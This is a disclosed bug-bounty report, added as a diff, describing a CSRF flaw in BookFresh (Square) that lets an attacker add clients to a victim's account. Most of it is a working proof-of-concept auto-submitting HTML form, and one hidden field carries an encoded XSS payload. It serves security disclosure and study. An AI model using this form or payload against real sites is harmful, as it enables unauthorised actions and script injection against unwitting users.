@@ -1,0 +1,55 @@
+ReportLink:https://hackerone.com/reports/30004
+WeaknessName:Cross-Site Request Forgery (CSRF)
+Reporter:https://hackerone.com/anshuman_bh
+ReportedTo:Square(square)
+BountyAmount:500.0
+Severity:
+State:Closed
+DateOfDisclosure:04.02.2015 19:17:48
+
+Summary:
+
+1. Authenticate to an account.
+
+2. Trick the victim to submit the following HTML:
+
+<html>
+  <body>
+    <form action="https://www.bookfresh.com/index.html" method="POST" enctype="multipart/form-data">
+      <input type="hidden" name="action" value="add&#95;customer" />
+      <input type="hidden" name="view" value="customer" />
+      <input type="hidden" name="action" value="add&#95;customer" />
+      <input type="hidden" name="view" value="customer" />
+      <input type="hidden" name="first&#95;name" value="csrf" />
+      <input type="hidden" name="last&#95;name" value="test" />
+      <input type="hidden" name="email" value="&#13;" />
+      <input type="hidden" name="phone" value="&#13;" />
+      <input type="hidden" name="phone&#95;type" value="0" />
+      <input type="hidden" name="cellphone" value="&#13;" />
+      <input type="hidden" name="cellphone&#95;type" value="0" />
+      <input type="hidden" name="company&#95;name" value="&#13;" />
+      <input type="hidden" name="address1" value="&#13;" />
+      <input type="hidden" name="address2" value="&#13;" />
+      <input type="hidden" name="city" value="&#13;" />
+      <input type="hidden" name="state" value="&#13;" />
+      <input type="hidden" name="zipcode" value="&#13;" />
+      <input type="hidden" name="birthday&#95;month" value="1" />
+      <input type="hidden" name="birthday&#95;day" value="1" />
+      <input type="hidden" name="birthday&#95;year" value="1920" />
+      <input type="hidden" name="notes" value="&#13;" />
+      <input type="hidden" name="merchant&#95;email" value="&quot;&gt;&lt;img&#32;src&#61;x&#32;onerror&#61;alert&#40;1&#41;&gt;&#32;&quot;&gt;&lt;img&#32;src&#61;x&#32;onerror&#61;alert&#40;1&#41;&gt;&lt;anshuman&#46;bhartiya&#43;4&#64;gmail&#46;com&gt;" />
+      <input type="hidden" name="subject" value="You&apos;re&#32;invited&#32;to&#32;book&#32;online" />
+      <input type="hidden" name="greeting" value="Dear&#32;csrf&#44;" />
+      <input type="hidden" name="message" value="As&#32;one&#32;of&#32;my&#32;most&#32;valued&#32;clients&#44;&#32;I&#32;wanted&#32;to&#32;tell&#32;you&#32;about&#32;a&#32;new&#32;service&#32;I&#32;am&#32;now&#32;offering&#58;&#32;online&#32;appointments&#46;&#13;&#10;&#13;&#10;It&apos;s&#32;a&#32;fast&#32;and&#32;easy&#32;way&#32;for&#32;you&#32;to&#32;make&#32;an&#32;appointment&#32;with&#32;me&#44;&#32;and&#32;it&apos;s&#32;completely&#32;free&#46;&#32;To&#32;get&#32;started&#44;&#32;just&#32;click&#32;the&#32;link&#32;below&#32;that&#32;will&#32;take&#32;you&#32;to&#32;my&#32;personalized&#32;online&#32;calendar&#46;&#9;&#13;&#10;&#13;&#10;Thank&#32;you&#44;&#13;&#10;&#45;&#32;&quot;&quot;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;" />
+      <input type="hidden" name="merchant&#95;hourtown&#95;address" value="https&#58;&#47;&#47;www&#46;bookfresh&#46;com&#47;" />
+      <input type="hidden" name="&#95;submit&#95;button" value="Add&#32;Customer" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+3. You will be redirected to a page which says "The page isn't redirecting properly" (Tested in Firefox). See screenshot.
+
+4. But, then when you go to clients, you will notice that a new client has been added. See screenshot. 
+
+An attacker can trick victim users to add clients without the victim's knowledge. 
